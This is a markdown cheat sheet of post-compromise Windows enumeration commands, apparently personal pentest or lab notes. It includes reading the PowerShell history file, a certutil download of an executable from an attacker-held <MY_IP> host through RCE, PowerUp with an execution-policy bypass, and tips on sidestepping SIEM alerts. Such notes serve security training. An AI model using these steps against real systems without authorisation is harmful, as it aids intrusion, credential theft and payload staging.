# basic enumeration of windows
- C:/windows/tasks     -   is a common (ALL) READ/WRITE directory
- winPEAS exists
- seatbelt exists
- `find` command exists, does it ? YES
- `cacls FILENAME`  access control lists; deprecated but sometimes has info

## notable files
> etc hosts
```
c:\Windows\System32\Drivers\etc\hosts
```

> powershell history
```
C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```



## the classics
```cmd.exe
systeminfo

wmic qfe get Caption, Description
; installed updates, hotfixes etc

net start
; started and installed services

wmic product get name,version,vendor
; installed apps

whoami /all  # (includes, /privs and /groups)
net user, net user /domain
net localgroup, net localgroup  GROUPNAME

net account, net accounts /domain  
; Get password policy info, among other stuff

```
> note that most of these are alarmed by the SIEM, especially those which enumerate the domain. powershell equivalents might be the way to go?


## network
> ports in use; all, binary(name of exe), no-resolve numbers, PID
```
netstat /?
netstat -abno
# -b is the valuable flag here, resolves binary name
```

> network interfaces, is this multi-homed?
```
ipconfig
```

> discover peers via pingsweep
```
PINGSWEEP SCRIPT, or manually
ping -a the results
```

> discovery peers, alternative to pingsweep, MAY BE ALARMED
```
arp -a
```

> host file, may reveal information
```
c:\Windows\System32\Drivers\etc\hosts
```


## cmd

> when enumerating through RCE; particularly useful for pulling/serving with certutil
```
cmd.exe /C 																			; executes a command in cmd.exe, similar to powershell -c
cmd.exe /C certutil -urlcache -split -f http://<MY_IP>/NAME_FILE.exe OUTFILE.exe 	; example of serving
```


> basic enumerations; drop these commands when you initially land
```sh
powershell> dir env: 								; list env vars for current user; excellent info here
whoami /all  (or /priv)
systeminfo
type C:\Users\USER_NAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

> serving files 
```sh
certutil -urlcache -split -f http://<MY_IP>/NAME_FILE.exe OUTFILE.exe 				; may not needs -split
```




## powershell
> initial enumerations
```
get-localuser															; lists users
get-localgroup															; lists groups
get-childitem -recurse -Depth 1											; nice way to get "tree" output
get-acl FILENAME
acl																		; shows owner+other stuff on directory/object pointed at
Get-Service | Where-Object -Property Status -eq Running 				; current running processes	 
```

> serving files
```
all cmd commands should work
also `wget` is a common alias which creates the `Invoke-WebRequest` powershell equivalent
```



> find command
```
get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *SEARCH_TERM*
https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ 
```

> grep equivalent; this will search entire filesystem; albeit with a lot of terminal noise
```
Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
```

## using common scripts
### PowerUp.ps1
```powershell
-ep bypass
import-module powerup.ps1 # or w.e u named it
invoke-allchecks          # this is a method defined in powerup.ps1
```
